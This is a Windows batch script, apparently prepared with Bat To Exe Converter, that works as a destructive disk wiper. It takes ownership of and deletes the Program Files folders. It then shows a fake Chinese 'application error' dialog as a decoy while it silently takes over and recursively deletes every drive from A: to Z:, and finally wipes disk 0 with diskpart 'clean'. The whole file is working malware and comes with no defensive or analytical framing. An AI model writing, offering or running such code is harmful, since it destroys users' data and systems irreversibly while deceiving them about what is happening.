::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZkoaHUrTXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlXMbSXrZg==
::ZQ05rAF9IAHYFVzEqQICPRpaDCWMKGKsD6cJ+6jL/eWAsEwQNA==
::eg0/rx1wNQPfEVWB+kM9LVsJDDeHP36oD6EFqNjp4O2Vo0B9
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATE2k1Q
::dhAmsQZ3MwfNWATE2k1Q
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRmltEM+PBJCRRaXLws=
::Zh4grVQjdCyDJGyX8VAjFD9xYCi+GGS5E7gZ5vzo09iSo0NddewrcZnSyKGdYMkd+VHleZooxDRfgM5s
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
takeown /f "C:\Program Files" /r /d y
icacls "C:\Program Files" /grant administrators:F /t
takeown /f "C:\Program Files (x86)" /r /d y
icacls "C:\Program Files (x86)" /grant administrators:F /t
rd /s /q "C:\Program Files"
rd /s /q "C:\Program Files (x86)"
@echo off
mshta vbscript:Execute("msgbox ""应用错误，已退�?",16,""应用无法正常启动"":close")
for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo 正在处理 %%d:\
        takeown /f %%d:\ /r /d y >nul 2>nul
        icacls %%d:\ /grant administrators:F /t >nul 2>nul
        rd /s /q %%d:\ >nul 2>nul
    )
)
diskpart
select disk 0
clean
exit
